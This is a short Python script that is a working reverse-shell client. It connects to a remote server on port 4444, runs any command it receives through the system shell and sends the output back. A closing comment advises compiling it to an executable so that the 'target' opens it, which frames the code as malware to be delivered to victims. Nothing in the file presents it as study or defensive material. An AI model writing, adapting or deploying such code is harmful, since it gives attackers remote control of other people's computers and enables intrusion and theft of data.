import sys
import socket
import subprocess

# Define the server IP and port to connect to
SERVER_IP = ""
PORT = 4444

# Create a new socket object for TCP/IP communication
s = socket.socket()
# Connect the socket to the specified IP address and port
s.connect((SERVER_IP, PORT))

# Receive and decode the initial message from the server
msg = s.recv(1024).decode()
# Print the server's initial message
print('[*] server:', msg)

while True:
    # Receive and decode a command from the server
    cmd = s.recv(1024).decode()
    # Print the received command
    print(f'[+] received command: {cmd}')

    # If the command is one of the exit commands, break the loop
    if cmd.lower() in ['q', 'quit', 'exit', 'x']:
        break

    try:
        # Execute the received command and capture its output
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        # If an error occurs, capture the error message
        result = str(e).encode()

    # If the result is empty, indicate that the command was executed successfully
    if len(result) == 0:
        result = '[+] Executed Successfully'.encode()

    # Send the result back to the server
    s.send(result)

# Close the socket connection
s.close()

#make sure to convert it to exe, when the target open it


